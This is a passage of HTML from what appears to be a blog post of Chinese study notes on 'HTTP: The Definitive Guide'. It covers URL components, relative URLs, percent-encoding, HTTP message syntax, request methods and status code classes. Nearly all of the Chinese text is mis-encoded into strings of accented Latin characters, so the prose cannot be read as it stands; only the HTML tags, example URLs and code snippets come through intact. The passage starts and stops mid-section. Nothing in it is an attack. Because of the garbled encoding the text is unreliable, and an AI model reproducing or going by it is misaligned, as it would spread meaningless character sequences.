æ–¹æ¡ˆ â€“ ä½¿ç”¨ä»€ä¹ˆåè®®</h4><p>æ–¹æ¡ˆï¼Œå‘Šè¯‰è´Ÿè´£è§£æ URL çš„åº”ç”¨ç¨‹åºåº”è¯¥ä½¿ç”¨ä»€ä¹ˆåè®®ã€‚</p><p>æ–¹æ¡ˆåæ˜¯å¤§å°å†™æ— å…³çš„ï¼Œ<code>https://</code> å’Œ <code>HTTPS://</code> ç­‰ä»·ã€‚</p><h4 id="2-2-2-ä¸»æœºä¸ç«¯å£"><a href="#2-2-2-ä¸»æœºä¸ç«¯å£" class="headerlink" title="2.2.2 ä¸»æœºä¸ç«¯å£"></a>2.2.2 ä¸»æœºä¸ç«¯å£</h4><p>ä¸»æœºç»„ä»¶æ ‡è¯†äº†å› ç‰¹ç½‘ä¸Šèƒ½å¤Ÿè®¿é—®èµ„æºçš„å®¿ä¸»æœºå™¨ã€‚å¦‚ç”¨åŸŸåæˆ– IP åœ°å€æ¥è¡¨ç¤ºä¸»æœºå.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.jows-hardware.com:<span class="hljs-number">80</span>/index.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">161.58</span>.<span class="hljs-number">228.45</span>:<span class="hljs-number">80</span>/index.html<br></code></pre></td></tr></table></figure><p>ç«¯å£ç»„ä»¶æ ‡è¯†äº†æœåŠ¡å™¨æ­£åœ¨ç›‘å¬çš„ç½‘ç»œç«¯å£ã€‚</p><h4 id="2-2-3-ç”¨æˆ·åå’Œå¯†ç "><a href="#2-2-3-ç”¨æˆ·åå’Œå¯†ç " class="headerlink" title="2.2.3 ç”¨æˆ·åå’Œå¯†ç "></a>2.2.3 ç”¨æˆ·åå’Œå¯†ç </h4><p>å¦‚æœæŸåº”ç”¨ç¨‹åºä½¿ç”¨çš„ URL æ–¹æ¡ˆè¦æ±‚è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†ç”¨æˆ·æ²¡æœ‰æä¾›ï¼Œå®ƒé€šå¸¸ä¼šæ’å…¥ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p><h4 id="2-2-4-è·¯å¾„"><a href="#2-2-4-è·¯å¾„" class="headerlink" title="2.2.4 è·¯å¾„"></a>2.2.4 è·¯å¾„</h4><p>URL çš„è·¯å¾„ç»„ä»¶è¯´æ˜äº†èµ„æºä½äºæœåŠ¡å™¨çš„ä»€ä¹ˆåœ°æ–¹ã€‚</p><p>å¯ä»¥ç”¨å­—ç¬¦ â€œ&#x2F;â€œ å°† HTTP URL çš„è·¯å¾„ç»„ä»¶åˆ’åˆ†æˆä¸€äº›è·¯å¾„æ®µ (path segment), æ¯ä¸ªè·¯å¾„æ®µéƒ½æœ‰è‡ªå·±çš„å‚æ•° (param) ç»„ä»¶ã€‚</p><h4 id="2-2-5-å‚æ•°"><a href="#2-2-5-å‚æ•°" class="headerlink" title="2.2.5 å‚æ•°"></a>2.2.5 å‚æ•°</h4><p>è´Ÿè´£è§£æ URL çš„åº”ç”¨ç¨‹åºéœ€è¦è¿™äº›åè®®å‚æ•°æ¥è®¿é—®èµ„æºã€‚</p><p>FTP æœ‰ä¸¤ç§ä¼ è¾“æ¨¡å¼:</p><ul><li>äºŒè¿›åˆ¶</li><li>æ–‡æœ¬å½¢å¼</li></ul><h4 id="2-2-6-æŸ¥è¯¢å­—ç¬¦ä¸²"><a href="#2-2-6-æŸ¥è¯¢å­—ç¬¦ä¸²" class="headerlink" title="2.2.6 æŸ¥è¯¢å­—ç¬¦ä¸²"></a>2.2.6 æŸ¥è¯¢å­—ç¬¦ä¸²</h4><p>å¾ˆå¤šèµ„æºï¼Œæ¯”å¦‚æ•°æ®åº“æœåŠ¡ï¼Œéƒ½æ˜¯å¯ä»¥é€šè¿‡æé—®é¢˜æˆ–è¿›è¡ŒæŸ¥è¯¢æ¥ç¼©å°æ‰€è¯·æ±‚èµ„æºçš„ç±»å‹èŒƒå›´ã€‚</p><p>æŒ‰ç…§å¸¸è§„ï¼Œå¾ˆå¤šç½‘å…³éƒ½å¸Œæœ›æŸ¥è¯¢å­—ç¬¦ä¸²ä»¥ä¸€ç³»åˆ— â€œå&#x3D;å€¼â€ å¯¹çš„å½¢å¼å‡ºç°ï¼Œåå€¼å¯¹ä¹‹é—´ç”¨å­—ç¬¦ â€œ&amp;â€ åˆ†éš”:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.joes-hardware.com/inventory-check.cgi?item=<span class="hljs-number">12731</span>&amp;color=blue<br></code></pre></td></tr></table></figure><h4 id="2-2-7-ç‰‡æ®µ"><a href="#2-2-7-ç‰‡æ®µ" class="headerlink" title="2.2.7 ç‰‡æ®µ"></a>2.2.7 ç‰‡æ®µ</h4><p>HTTP æœåŠ¡å™¨é€šå¸¸åªå¤„ç†æ•´ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯å¯¹è±¡çš„ç‰‡æ®µï¼Œå®¢æˆ·ç«¯ä¸èƒ½å°†ç‰‡æ®µä¼ é€ç»™æœåŠ¡å™¨ï¼Œæµè§ˆå™¨ä»æœåŠ¡å™¨è·å¾—äº†æ•´ä¸ªèµ„æºåï¼Œä¼šæ ¹æ®ç‰‡æ®µæ¥æ˜¾ç¤ºä½ æ„Ÿå…´è¶£çš„é‚£éƒ¨åˆ†èµ„æºã€‚</p><h3 id="2-3-URL-å¿«æ·æ–¹å¼"><a href="#2-3-URL-å¿«æ·æ–¹å¼" class="headerlink" title="2.3 URL å¿«æ·æ–¹å¼"></a>2.3 URL å¿«æ·æ–¹å¼</h3><h4 id="2-3-1-ç›¸å¯¹-URL"><a href="#2-3-1-ç›¸å¯¹-URL" class="headerlink" title="2.3.1 ç›¸å¯¹ URL"></a>2.3.1 ç›¸å¯¹ URL</h4><p>URL æœ‰ä¸¤ç§æ–¹å¼:</p><ul><li>ç»å¯¹ URL, å…¶åŒ…å«è®¿é—®èµ„æºæ‰€éœ€çš„å…¨éƒ¨ä¿¡æ¯</li><li>ç›¸å¯¹ URL, éœ€å€ŸåŠ©åŸºç¡€ (base) URL è¿›è¡Œè§£æ<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80URL.png" alt="ä½¿ç”¨åŸºç¡€ URL"><br><img src="/../img/%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80URL.png" alt="ä½¿ç”¨åŸºç¡€ URL"></li></ul><h5 id="åŸºç¡€-URL"><a href="#åŸºç¡€-URL" class="headerlink" title="åŸºç¡€ URL"></a>åŸºç¡€ URL</h5><p>è½¬æ¢å¤„ç†çš„ç¬¬ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°åŸºç¡€ URL.</p><p>åŸºç¡€ URL å¯ä»¥æ¥è‡ª:</p><ul><li>åœ¨èµ„æºä¸­æ˜¾ç¤ºæä¾›ï¼Œå¦‚åœ¨ HTML æ–‡æ¡£ä¸­åŒ…å«ä¸€ä¸ªå®šä¹‰äº†åŸºç¡€ URL çš„ HTML æ ‡è®° <code>&lt;BASE&gt;</code>.</li><li>å°è£…èµ„æºçš„åŸºç¡€ URL, å°†å®ƒæ‰€å±èµ„æºçš„ URL ä½œä¸ºåŸºç¡€</li><li>æ²¡æœ‰åŸºç¡€ URL</li></ul><h5 id="è§£æç›¸å¯¹å¼•ç”¨"><a href="#è§£æç›¸å¯¹å¼•ç”¨" class="headerlink" title="è§£æç›¸å¯¹å¼•ç”¨"></a>è§£æç›¸å¯¹å¼•ç”¨</h5><p>é€šå¸¸ç§°ä½œåˆ†è§£ (decomposing) URL, å°†1åŸºç¡€å’Œç›¸å¯¹ URL åˆ’åˆ†æˆç»„ä»¶ã€‚</p><h4 id="2-3-2-è‡ªåŠ¨æ‰©å±•-URL"><a href="#2-3-2-è‡ªåŠ¨æ‰©å±•-URL" class="headerlink" title="2.3.2 è‡ªåŠ¨æ‰©å±• URL"></a>2.3.2 è‡ªåŠ¨æ‰©å±• URL</h4><p>ç”¨æˆ·ä¸éœ€è¦è¾“å…¥å®Œæ•´çš„ URL, å› ä¸ºæµè§ˆå™¨ä¼šè‡ªåŠ¨æ‰©å±•ã€‚</p><p>ä»¥ä¸‹ä¸¤ç§æ–¹å¼:</p><ul><li>ä¸»æœºåæ‰©å±•</li><li>å†å²æ‰©å±•</li></ul><h3 id="2-4-å„ç§ä»¤äººå¤´ç–¼çš„å­—ç¬¦"><a href="#2-4-å„ç§ä»¤äººå¤´ç–¼çš„å­—ç¬¦" class="headerlink" title="2.4 å„ç§ä»¤äººå¤´ç–¼çš„å­—ç¬¦"></a>2.4 å„ç§ä»¤äººå¤´ç–¼çš„å­—ç¬¦</h3><h4 id="2-4-1-URL-å­—ç¬¦é›†"><a href="#2-4-1-URL-å­—ç¬¦é›†" class="headerlink" title="2.4.1 URL å­—ç¬¦é›†"></a>2.4.1 URL å­—ç¬¦é›†</h4><p>é€šè¿‡<mark>è½¬ä¹‰åºåˆ—</mark>, å°±å¯ä»¥ç”¨ US-ASCII å­—ç¬¦é›†çš„æœ‰é™å­é›†å¯¹ä»»æ„å­—ç¬¦å€¼æˆ–æ•°æ®è¿›è¡Œç¼–ç .</p><h4 id="2-4-2-ç¼–ç æœºåˆ¶"><a href="#2-4-2-ç¼–ç æœºåˆ¶" class="headerlink" title="2.4.2 ç¼–ç æœºåˆ¶"></a>2.4.2 ç¼–ç æœºåˆ¶</h4><p>ä¸ºäº†é¿å¼€å®‰å…¨è‡ªè´Ÿå³è¡¨ç¤ºæ³•å¸¦æ¥çš„é™åˆ¶ï¼Œäººä»¬è®¾è®¡äº†ä¸€ç§ç¼–ç æœºåˆ¶ï¼Œç”¨æ¥åœ¨ URL ä¸­è¡¨ç¤ºå„ç§ä¸å®‰å…¨çš„å­—ç¬¦ã€‚</p><p>è¿™ç§ç¼–ç æœºåˆ¶å°±æ˜¯é€šè¿‡ä¸€ç§â€è½¬ä¹‰â€è¡¨ç¤ºæ³•æ¥è¡¨ç¤ºä¸å®‰å…¨å­—ç¬¦çš„ï¼Œè¿™ç§è½¬ä¹‰è¡¨ç¤ºæ³•åŒ…å«:</p><ul><li>ä¸€ä¸ªç™¾åˆ†å· (%)</li><li>ç™¾åˆ†å·åè·Ÿç€ä¸¤ä¸ªè¡¨ç¤ºå­—ç¬¦ ASCII ç çš„åå…­è¿›åˆ¶æ•°</li></ul><h4 id="2-4-3-å­—ç¬¦é™åˆ¶"><a href="#2-4-3-å­—ç¬¦é™åˆ¶" class="headerlink" title="2.4.3 å­—ç¬¦é™åˆ¶"></a>2.4.3 å­—ç¬¦é™åˆ¶</h4><p>å³ç‰¹æ®Šå­—ç¬¦ï¼Œä½¿ç”¨åŸæ„æ—¶éœ€è½¬ä¹‰:<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E4%BF%9D%E7%95%99%E5%8F%8A%E5%8F%97%E9%99%90%E7%9A%84%E5%AD%97%E7%AC%A6.png" alt="ä¿ç•™åŠå—é™çš„å­—ç¬¦"><br><img src="/../img/%E4%BF%9D%E7%95%99%E5%8F%8A%E5%8F%97%E9%99%90%E7%9A%84%E5%AD%97%E7%AC%A6.png" alt="ä¿ç•™åŠå—é™çš„å­—ç¬¦"></p><h3 id="2-5-æ–¹æ¡ˆçš„ä¸–ç•Œ"><a href="#2-5-æ–¹æ¡ˆçš„ä¸–ç•Œ" class="headerlink" title="2.5 æ–¹æ¡ˆçš„ä¸–ç•Œ"></a>2.5 æ–¹æ¡ˆçš„ä¸–ç•Œ</h3><p>å¸¸è§çš„æ–¹æ¡ˆåŠæ ¼å¼:<br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F.png" alt="å¸¸è§çš„æ–¹æ¡ˆåŠæ ¼å¼"><br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F2.png" alt="å¸¸è§çš„æ–¹æ¡ˆåŠæ ¼å¼"><br><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%B9%E6%A1%88%E5%8F%8A%E6%A0%BC%E5%BC%8F3.png" alt="å¸¸è§çš„æ–¹æ¡ˆåŠæ ¼å¼"></p><h2 id="ç¬¬3ç« -HTTP-æŠ¥æ–‡"><a href="#ç¬¬3ç« -HTTP-æŠ¥æ–‡" class="headerlink" title="ç¬¬3ç«  HTTP æŠ¥æ–‡"></a>ç¬¬3ç«  HTTP æŠ¥æ–‡</h2><h3 id="3-1-æŠ¥æ–‡æµ"><a href="#3-1-æŠ¥æ–‡æµ" class="headerlink" title="3.1 æŠ¥æ–‡æµ"></a>3.1 æŠ¥æ–‡æµ</h3><p>HTTP æŠ¥æ–‡æ˜¯åœ¨ HTTP åº”ç”¨ç¨‹åºä¹‹é—´å‘é€çš„æ•°æ®å—ã€‚</p><p>æŠ¥æ–‡åœ¨å®¢æˆ·ç«¯ã€æœåŠ¡å™¨å’Œä»£ç†ä¹‹é—´æµåŠ¨ï¼Œæœ¯è¯­ â€œæµå…¥â€, â€œæµå‡ºâ€, â€œä¸Šæ¸¸â€, â€œä¸‹æ¸¸â€ éƒ½æ˜¯ç”¨æ¥æè¿°æŠ¥æ–‡æ–¹å‘çš„ã€‚</p><h4 id="3-1-1-æŠ¥æ–‡"><a href="#3-1-1-æŠ¥æ–‡" class="headerlink" title="3.1.1 æŠ¥æ–‡"></a>3.1.1 æŠ¥æ–‡</h4><p>HTTP ä½¿ç”¨æœ¯è¯­ æµå…¥ (inbound) å’Œ æµå‡º (outbound) æ¥æè¿°äº‹åŠ¡å¤„ç† (transaction) çš„æ–¹å‘ã€‚</p><p>â€œæµå…¥â€ æ˜¯æµå‘æœåŠ¡å™¨æ–¹å‘ï¼Œâ€æµå‡ºâ€ æ˜¯æµå‘ç”¨æˆ· Agent ä»£ç†æ–¹å‘ã€‚</p><h4 id="3-1-2-æŠ¥æ–‡å‘ä¸‹æ¸¸æµåŠ¨"><a href="#3-1-2-æŠ¥æ–‡å‘ä¸‹æ¸¸æµåŠ¨" class="headerlink" title="3.1.2 æŠ¥æ–‡å‘ä¸‹æ¸¸æµåŠ¨"></a>3.1.2 æŠ¥æ–‡å‘ä¸‹æ¸¸æµåŠ¨</h4><p>ä¸ç®¡æ˜¯è¯·æ±‚æŠ¥æ–‡è¿˜æ˜¯å“åº”æŠ¥æ–‡ï¼Œæ‰€æœ‰æŠ¥æ–‡éƒ½ä¼šå‘ä¸‹æ¸¸ (downstream) æµåŠ¨ã€‚æ‰€æœ‰æŠ¥æ–‡çš„å‘é€è€…éƒ½åœ¨æ¥æ”¶è€…çš„ä¸Šæ¸¸ (upstream).</p><h3 id="3-2-æŠ¥æ–‡çš„ç»„æˆéƒ¨åˆ†"><a href="#3-2-æŠ¥æ–‡çš„ç»„æˆéƒ¨åˆ†" class="headerlink" title="3.2 æŠ¥æ–‡çš„ç»„æˆéƒ¨åˆ†"></a>3.2 æŠ¥æ–‡çš„ç»„æˆéƒ¨åˆ†</h3><p>æ¯æ¡æŠ¥æ–‡éƒ½åŒ…å«ä¸€æ¡æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œæ´»ç€ä¸€æ¡æ¥è‡ªæœåŠ¡å™¨çš„å“åº”ã€‚</p><p>å…¶åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†:<br><img src="/../img/HTTP%E6%8A%A5%E6%96%87%E7%9A%84%E4%B8%89%E4%B8%AA%E9%83%A8%E5%88%86.png" alt="HTTP æŠ¥æ–‡çš„ä¸‰ä¸ªéƒ¨åˆ†"><br><code>Content-Type</code> è¡Œè¯´æ˜äº†ä¸»ä½“æ˜¯ä»€ä¹ˆã€‚</p><p><code>Content-Length</code> è¡Œè¯´æ˜äº†ä¸»ä½“æœ‰å¤šå¤§ã€‚</p><h4 id="3-2-1-æŠ¥æ–‡çš„è¯­æ³•"><a href="#3-2-1-æŠ¥æ–‡çš„è¯­æ³•" class="headerlink" title="3.2.1 æŠ¥æ–‡çš„è¯­æ³•"></a>3.2.1 æŠ¥æ–‡çš„è¯­æ³•</h4><p>è¯·æ±‚æŠ¥æ–‡æ ¼å¼:</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;<span class="hljs-keyword">method</span>&gt; &lt;<span class="hljs-title function_">request</span>-<span class="hljs-title function_">URL</span>&gt; &lt;<span class="hljs-title function_">version</span>&gt; # è¿™æ˜¯è¯·æ±‚è¡Œï¼Œå­—æ®µç”¨ç©ºæ ¼åˆ†éš”<br>&lt;<span class="hljs-title function_">headers</span>&gt;<br><br>&lt;<span class="hljs-title function_">entity</span>-<span class="hljs-title function_">body</span>&gt;<br></code></pre></td></tr></table></figure><p>å“åº”æŠ¥æ–‡æ ¼å¼:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;version&gt;</span> <span class="hljs-section">&lt;status&gt;</span> <span class="hljs-section">&lt;reason-phrase&gt;</span> <span class="hljs-comment"># è¿™æ˜¯å“åº”è¡Œï¼Œä¹Ÿç”±ç©ºæ ¼åˆ†éš”å­—æ®µ</span><br><span class="hljs-section">&lt;headers&gt;</span><br><br><span class="hljs-section">&lt;entity-body&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸€ç»„ HTTP é¦–éƒ¨æ€»åº”è¯¥ä»¥ä¸€ä¸ªç©ºè¡Œç»“æŸï¼Œç”šè‡³å³ä½¿æ²¡æœ‰é¦–éƒ¨å’Œå®ä½“çš„ä¸»ä½“éƒ¨åˆ†ä¹Ÿåº”å¦‚æ­¤.</p><p>æœ‰äº›æœåŠ¡å™¨ä¼šå®ç°ä¸€äº›è‡ªå·±çš„è¯·æ±‚æ–¹æ³•ï¼Œè¿™äº›é™„åŠ çš„æ–¹æ³•æ˜¯å¯¹ HTTP è§„èŒƒçš„æ‰©å±•ï¼Œè¢«ç§°ä¸º<mark>æ‰©å±•æ–¹æ³•</mark>.</p><p><img src="/../img/%E7%8A%B6%E6%80%81%E7%A0%81%E5%88%86%E7%B1%BB.png" alt="çŠ¶æ€ç åˆ†ç±»"></p><p>åŸå› çŸ­è¯­æ˜¯å“åº”èµ·å§‹è¡Œä¸­çš„æœ€åä¸€ä¸ªç»„ä»¶. å®ƒä¸ºçŠ¶æ€ç æä¾›äº†æ–‡æœ¬å½¢å¼çš„è§£é‡Š.</p><p>ç‰ˆæœ¬å·ä¸ä¼šè¢«å½“åšå°æ•°å¤„ç†ï¼Œç‰ˆæœ¬ä¸­çš„æ¯ä¸ªæ•°å­—éƒ½ä¼šè¢«å½“åšä¸€ä¸ªå•ç‹¬çš„æ•°å­—æ¥å¤„ç†ï¼Œå› æ­¤ï¼Œåœ¨æ¯”è¾ƒ HTTP ç‰ˆæœ¬æ—¶ï¼Œæ¯ä¸ªæ•°å­—éƒ½å¿…é¡»è¦å•ç‹¬è¿›è¡Œæ¯”è¾ƒï¼Œä»¥ä¾¿ç¡®å®šå“ªä¸ªç‰ˆæœ¬æ›´é«˜, å¦‚: HTTP&#x2F;2.22 æ¯” HTTP&#x2F;2.3 çš„ç‰ˆæœ¬é«˜.</p><h4 id="3-2-3-é¦–éƒ¨"><a href="#3-2-3-é¦–éƒ¨" class="headerlink" title="3.2.3 é¦–éƒ¨"></a>3.2.3 é¦–éƒ¨</h4><p>æ¯ä¸ª HTTP é¦–éƒ¨éƒ½æœ‰ä¸€ç§ç®€å•çš„è¯­æ³•: åå­—åé¢è·Ÿç€å†’å· <code>:</code> , ç„¶åè·Ÿä¸Šå¯é€‰çš„ç©ºæ ¼ï¼Œå†è·Ÿä¸Šå­—æ®µå€¼ï¼Œæœ€åæ˜¯ä¸€ä¸ª CRLF.</p><p><img src="/../img/%E5%B8%B8%E8%A7%81%E7%9A%84%E9%A6%96%E9%83%A8%E5%AE%9E%E4%BE%8B.png" alt="å¸¸è§çš„é¦–éƒ¨å®ä¾‹"></p><h5 id="é¦–éƒ¨å»¶ç»­è¡Œ"><a href="#é¦–éƒ¨å»¶ç»­è¡Œ" class="headerlink" title="é¦–éƒ¨å»¶ç»­è¡Œ"></a>é¦–éƒ¨å»¶ç»­è¡Œ</h5><p>å°†é•¿çš„é¦–éƒ¨è¡Œåˆ†ä¸ºå¤šè¡Œå¯ä»¥æé«˜å¯è¯»æ€§ï¼Œå¤šå‡ºæ¥çš„æ¯è¡Œå‰é¢è‡³å°‘è¦æœ‰ä¸€ä¸ªç©ºæ ¼æˆ–åˆ¶è¡¨ç¬¦.</p><h4 id="3-2-4-å®ä½“çš„ä¸»ä½“éƒ¨åˆ†"><a href="#3-2-4-å®ä½“çš„ä¸»ä½“éƒ¨åˆ†" class="headerlink" title="3.2.4 å®ä½“çš„ä¸»ä½“éƒ¨åˆ†"></a>3.2.4 å®ä½“çš„ä¸»ä½“éƒ¨åˆ†</h4><p>HTTP æŠ¥æ–‡çš„ç¬¬ä¸‰éƒ¨åˆ†æ˜¯å¯é€‰çš„å®ä½“ä¸»ä½“éƒ¨åˆ†ï¼Œå®ä½“çš„ä¸»ä½“æ˜¯ HTTP æŠ¥æ–‡çš„è´Ÿè·ï¼Œå°±æ˜¯ HTTP è¦ä¼ è¾“çš„å†…å®¹ã€‚</p><h4 id="3-2-5-ç‰ˆæœ¬-0-9-çš„æŠ¥æ–‡"><a href="#3-2-5-ç‰ˆæœ¬-0-9-çš„æŠ¥æ–‡" class="headerlink" title="3.2.5 ç‰ˆæœ¬ 0.9 çš„æŠ¥æ–‡"></a>3.2.5 ç‰ˆæœ¬ 0.9 çš„æŠ¥æ–‡</h4><h3 id="3-3-æ–¹æ³•"><a href="#3-3-æ–¹æ³•" class="headerlink" title="3.3 æ–¹æ³•"></a>3.3 æ–¹æ³•</h3><p>å¦‚æœä¸€å°æœåŠ¡å™¨è¦ä¸ HTTP 1.1 å…¼å®¹ï¼Œé‚£ä¹ˆåªè¦ä¸ºå…¶èµ„æºå®ç° GET æ–¹æ³•å’Œ HEAD æ–¹æ³•å°±å¯ä»¥äº†.</p><h4 id="3-3-1-å®‰å…¨æ–¹æ³•"><a href="#3-3-1-å®‰å…¨æ–¹æ³•" class="headerlink" title="3.3.1 å®‰å…¨æ–¹æ³•"></a>3.3.1 å®‰å…¨æ–¹æ³•</h4><p>HTTP å®šä¹‰äº†ä¸€ç»„è¢«ç§°ä¸º<mark>å®‰å…¨æ–¹æ³•</mark>çš„æ–¹æ³•ï¼ŒGET æ–¹æ³•å’Œ HEAD æ–¹æ³•éƒ½è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚</p><h4 id="3-3-2-GET"><a href="#3-3-2-GET" class="headerlink" title="3.3.2 GET"></a>3.3.2 GET</h4><p>GET æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œé€šå¸¸ç”¨äºè¯·æ±‚æœåŠ¡å™¨å‘é€æŸä¸ªèµ„æº.</p><h4 id="3-3-3-HEAD"><a href="#3-3-3-HEAD" class="headerlink" title="3.3.3 HEAD"></a>3.3.3 HEAD</h4><p>HEAD æ–¹æ³•å’Œ GET æ–¹æ³•çš„è¡Œä¸ºå¾ˆç±»ä¼¼ï¼Œä½†æœåŠ¡å™¨åœ¨å“åº”ä¸­åªè¿”å›é¦–éƒ¨ã€‚ä¸ä¼šåæ‚”å®ä½“çš„ä¸»ä½“éƒ¨åˆ†.</p><h4 id="3-3-4-PUT"><a href="#3-3-4-PUT" class="headerlink" title="3.3.4 PUT"></a>3.3.4 PUT</h4><p>å‘æœåŠ¡å™¨å†™å…¥æ–‡æ¡£ã€‚</p><h4 id="3-3-5-POST"><a href="#3-3-5-POST" class="headerlink" title="3.3.5 POST"></a>3.3.5 POST</h4><p>é€šå¸¸ç”¨äºæ”¯æŒ HTML çš„è¡¨å•ã€‚</p><h4 id="3-3-6-TRACE"><a href="#3-3-6-TRACE" class="headerlink" title="3.3.6 TRACE"></a>3.3.6 TRACE</h4><p>å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶è¿™ä¸ªè¯·æ±‚å¯èƒ½è¦ç©¿è¿‡é˜²ç«å¢™ã€ä»£ç†ã€ç½‘å…³æˆ–å…¶ä»–ä¸€äº›åº”ç”¨ç¨‹åºï¼Œæ¯ä¸ªä¸­é—´èŠ‚ç‚¹éƒ½å¯èƒ½ä¼šä¿®æ”¹åŸå§‹çš„ HTTP è¯·æ±‚ã€‚TRACE æ–¹æ³•å…è®¸å®¢æˆ·ç«¯åœ¨æœ€ç»ˆå°†è¯·æ±‚å‘é€ç»™æœåŠ¡å™¨æ—¶ï¼Œçœ‹çœ‹å®ƒå˜æˆäº†ä»€ä¹ˆæ ·å­.</p><p>TRACE æ–¹æ³•åªè¦ç”¨äºè¯Šæ–­ã€‚</p><h4 id="3-3-7-OPTIONS"><a href="#3-3-7-OPTIONS" class="headerlink" title="3.3.7 OPTIONS"></a>3.3.7 OPTIONS</h4><p>è¯¥æ–¹æ³•è¯·æ±‚ Web æœåŠ¡å™¨å‘ŠçŸ¥å…¶æ”¯æŒçš„å„ç§åŠŸèƒ½ã€‚</p><h4 id="3-3-8-DELETE"><a href="#3-3-8-DELETE" class="headerlink" title="3.3.8 DELETE"></a>3.3.8 DELETE</h4><p>è¯·æ±‚æœåŠ¡å™¨åˆ é™¤è¯·æ±‚ URL æ‰€æŒ‡å®šçš„èµ„æº.</p><p>å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ— æ³•ä¿è¯åˆ é™¤æ“ä½œä¸€å®šä¼šè¢«æ‰§è¡Œã€‚å› ä¸º HTTP è§„èŒƒå…è®¸æœåŠ¡å™¨åœ¨ä¸é€šçŸ¥å®¢æˆ·ç«¯çš„æƒ…å†µä¸‹æ’¤é”€è¯·æ±‚.</p><h3 id="3-4-çŠ¶æ€ç "><a href="#3-4-çŠ¶æ€ç " class="headerlink" title="3.4 çŠ¶æ€ç "></a>3.4 çŠ¶æ€ç </h3><p>HTTP çŠ¶æ€ç è¢«åˆ†æˆäº”å¤§ç±»ã€‚</p><p>çŠ¶æ€ç ä¸ºå®¢æˆ·ç«¯æä¾›äº†ä¸€ç§ç†è§£äº‹åŠ¡å¤„ç†ç»“æœçš„ä¾¿æ·æ–¹å¼.</p><h4 id="3-4-1-100-199-â€“-ä¿¡æ¯æ€§çŠ¶æ€ç "><a href="#3-4-1-100-199-â€“-ä¿¡æ¯æ€§çŠ¶æ€ç " class="headerlink" title="3.4.1 100 ~ 199 â€“ ä¿¡æ¯æ€§çŠ¶æ€ç "></a>3.4.1 100 ~ 199 â€“ ä¿¡æ¯æ€§çŠ¶æ€ç </h4><h4 id="3-4-2-200-299-â€“-æˆåŠŸçŠ¶æ€ç "><a href="#3-4-2-200-299-â€“-æˆåŠŸçŠ¶æ€ç " class="headerlink" title="3.4.2 200 ~ 299 â€“ æˆåŠŸçŠ¶æ€ç "></a>3.4.2 200 ~ 299 â€“ æˆåŠŸçŠ¶æ€ç </h4><h4 id="3-4-3-300-399-â€“-é‡å®šå‘çŠ¶æ€ç "><a href="#3-4-3-300-399-â€“-é‡å®šå‘çŠ¶æ€ç " class="headerlink" title="3.4.3 300 ~ 399 â€“ é‡å®šå‘çŠ¶æ€ç "></a>3.4.3 300 ~ 399 â€“ é‡å®šå‘çŠ¶æ€ç </h4><p>é‡å®šå‘çŠ¶æ€ç è¦ä¹ˆå‘Šè¯‰å®¢æˆ·ç«¯ä½¿ç”¨æ›¿ä»£ä½ç½®æ¥è®¿é—®ä»–ä»¬æ‰€æ„Ÿå…´è¶£çš„èµ„æºï¼Œè¦ä¹ˆå°±æä¾›ä¸€ä¸ªæ›¿ä»£çš„å“åº”è€Œä¸æ˜¯èµ„æºçš„å†…å®¹ã€‚</p><h4 id="3-4-4-400-499-â€“-å®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç "><a href="#3-4-4-400-499-â€“-å®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç " class="headerlink" title="3.4.4 400 ~ 499 â€“ å®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç "></a>3.4.4 400 ~ 499 â€“ å®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç </h4><h4 id="3-4-5-500-599-â€“-æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç "><a href="#3-4-5-500-599-â€“-æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç " class="headerlink" title="3.4.5 500 ~ 599 â€“ æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç "></a>3.4.5 500 ~ 599 â€“ æœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç </h4><p>æœåŠ¡å™¨è‡ªèº«å‡ºé”™äº†.</p><h3 id="3-5-é¦–éƒ¨"><a href="#3-5-é¦–éƒ¨" class="headerlink" title="3.5 é¦–éƒ¨"></a>3.5 